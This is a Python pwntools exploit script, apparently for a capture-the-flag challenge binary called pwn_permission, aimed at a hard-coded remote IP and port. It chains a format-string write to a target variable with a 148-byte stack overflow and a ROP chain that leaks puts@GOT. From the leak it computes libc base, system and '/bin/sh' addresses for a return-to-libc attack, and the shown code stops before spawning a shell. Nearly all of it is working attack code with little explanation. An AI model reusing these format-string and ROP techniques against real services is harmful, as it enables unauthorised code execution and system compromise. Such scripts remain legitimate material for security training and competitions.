from pwn import *
import time

context(arch='i386', os='linux', log_level='debug')

HOST = '39.96.193.120'
PORT = 10000

elf = ELF('d:/iscc/pwn2/pwn_permission')

target_val_addr = 0x804c030
main_addr = elf.symbols['main']
vuln_addr = elf.symbols['vuln']
puts_plt = elf.plt['puts']
write_plt = elf.plt['write']
puts_got = elf.got['puts']

conn = remote(HOST, PORT)

data = conn.recv(timeout=5)
print(f"\n[1] Banner: {data}")

fmt_payload = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload)
time.sleep(2)

response = conn.recv(timeout=5)
print(f"\n[2] After fmt: {response}")

# Test 1: Simple return to main
print("\n[3] Sending simple return-to-main payload...")
payload = b'A' * 148
payload += p32(main_addr)

conn.send(payload)
time.sleep(2)

try:
    response2 = conn.recv(timeout=5)
    print(f"\n[4] After return-to-main: {response2}")
except EOFError:
    print("\n[4] Connection closed - return-to-main failed!")
    conn.close()
    exit(1)

# If we get here, return-to-main works!
# Now test with puts leak
print("\n[5] Return-to-main works! Now testing puts leak...")

# Send format string again
fmt_payload2 = b'%5c%6$na' + p32(target_val_addr)
conn.send(fmt_payload2)
time.sleep(2)

try:
    response3 = conn.recv(timeout=5)
    print(f"\n[6] After fmt2: {response3}")
except:
    print("\n[6] No response after fmt2")

# Send overflow with puts leak
pop4_ret = 0x08049380  # pop ebx; pop esi; pop edi; pop ebp; ret

payload2 = b'B' * 148
payload2 += p32(puts_plt)       # call puts
payload2 += p32(pop4_ret)       # return after puts (cleanup)
payload2 += p32(puts_got)       # argument: print *puts@GOT
payload2 += p32(0)              # dummy for pop esi
payload2 += p32(0)              # dummy for pop edi
payload2 += p32(0)              # dummy for pop ebp
payload2 += p32(main_addr)      # then return to main

conn.send(payload2)
time.sleep(1)

try:
    leaked = conn.recv(timeout=3)
    print(f"\n[7] Leaked data ({len(leaked)} bytes): {leaked.hex()}")
    
    if len(leaked) >= 4:
        # Find the puts address - it should be a libc address
        for i in range(len(leaked) - 3):
            candidate = u32(leaked[i:i+4])
            if 0xf7000000 < candidate < 0xf7ffffff:
                puts_addr = candidate
                print(f"\n[8] puts@libc = 0x{puts_addr:x}")
                libc_base = puts_addr - 0x6d1e0
                system_addr = libc_base + 0x41360
                binsh_addr = libc_base + 0x18c363
                print(f"    libc_base = 0x{libc_base:x}")
                print(f"    system = 0x{system_addr:x}")
                print(f"    /bin/sh = 0x{binsh_addr:x}")
                break
except EOFError:
    print("\n[7] Connection closed - puts leak failed!")
    conn.close()
    exit(1)

conn.close()
